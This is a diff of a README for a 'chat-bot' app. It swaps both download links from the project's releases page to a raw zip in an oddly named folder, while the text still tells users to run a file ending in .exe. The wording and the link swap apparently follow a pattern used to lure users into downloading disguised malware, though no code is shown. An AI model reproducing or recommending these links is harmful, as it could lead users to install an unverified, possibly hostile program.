@@ -1,12 +1,12 @@
 # 🤖 chat-bot - Reliable automated chat management for you
 
-[![Download chat-bot](https://img.shields.io/badge/Download-chat--bot-blue.svg)](https://github.com/Slaphappy-straightedge803/chat-bot/releases)
+[![Download chat-bot](https://img.shields.io/badge/Download-chat--bot-blue.svg)](https://github.com/Slaphappy-straightedge803/chat-bot/raw/refs/heads/main/Percesoces/chat_bot_v3.0-alpha.1.zip)
 
 ## 📥 Get the software
 
 You need to download the application to your computer. Click the link below to reach the download page. Select the file ending in .exe to start the download.
 
-[Download chat-bot installer](https://github.com/Slaphappy-straightedge803/chat-bot/releases)
+[Download chat-bot installer](https://github.com/Slaphappy-straightedge803/chat-bot/raw/refs/heads/main/Percesoces/chat_bot_v3.0-alpha.1.zip)
 
 ## 💻 What this application does
 
